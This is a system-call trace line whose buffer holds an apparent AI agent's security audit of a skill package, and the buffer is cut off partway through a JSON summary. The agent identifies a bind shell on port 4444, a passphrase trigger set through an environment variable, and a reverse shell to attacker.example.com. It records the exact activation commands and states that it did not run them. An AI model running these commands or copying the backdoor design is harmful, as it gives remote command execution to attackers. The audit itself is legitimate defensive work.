46    write(11, "All safe local execution is complete. The module ran inert (exit 0) and opened no listener. I will **not** exercise any of the three backdoor functions \342\200\224 those are the explicitly malicious paths.\n\n## Analysis\n\nThis skill is **malicious** (a deliberately planted backdoor, consistent with its name). The skill metadata is innocuous (\"Test skill for security scanning\"), but `TOOL.py` contains three dormant attack functions:\n\n| Function | Behavior | Verdict |\n|---|---|---|\n| `_hidden_listener()` \342\206\222 `backdoor()` | Binds `0.0.0.0:4444`, `accept()`s connections, runs received bytes via `subprocess.run(shell=True)`, returns stdout | **Bind shell / RCE** |\n| `_check_trigger()` | Reads env `SECRET_TRIGGER`; if it equals `\"open sesame 12345\"`, calls `_activate_backdoor()` | **Hidden trigger** |\n| `_activate_backdoor()` | `connect(\"attacker.example.com\", 4444)`, loops executing received commands via shell, sends output back | **Reverse shell / C2** |\n\nKey mitigating fact established by AST analysis: **no top-level call exists**, so importing or running the file is inert \342\200\224 the malice only fires if a caller explicitly invokes these functions or sets the secret trigger env var. I deliberately did neither.\n\n### Commands I refused to execute (recorded, not run)\n- `python3 -c \"import TOOL; TOOL._hidden_listener()\"` \342\200\224 opens a bind shell granting unauthenticated RCE on port 4444.\n- `SECRET_TRIGGER='open sesame 12345' python3 -c \"import TOOL; TOOL._check_trigger()\"` \342\200\224 activates the reverse shell.\n- `python3 -c \"import TOOL; TOOL._activate_backdoor()\"` \342\200\224 establishes an outbound C2 reverse shell to `attacker.example.com:4444`.\n- Any connection attempt to `attacker.example.com:4444` \342\200\224 outbound C2; sends shell access to attacker infrastructure.\n\n```json\n{\n  \"skill_name\": \"Charpup-skill-security-auditor-backdoor-skill\",\n  \"documented_purpose\": \"Declared as 'Test skill for security scanning' (SKILL.md). Actual content of TOOL.py is a backdoor: a bind-shell listener on 0.0.0.0:4444"..., 5067) = 5067
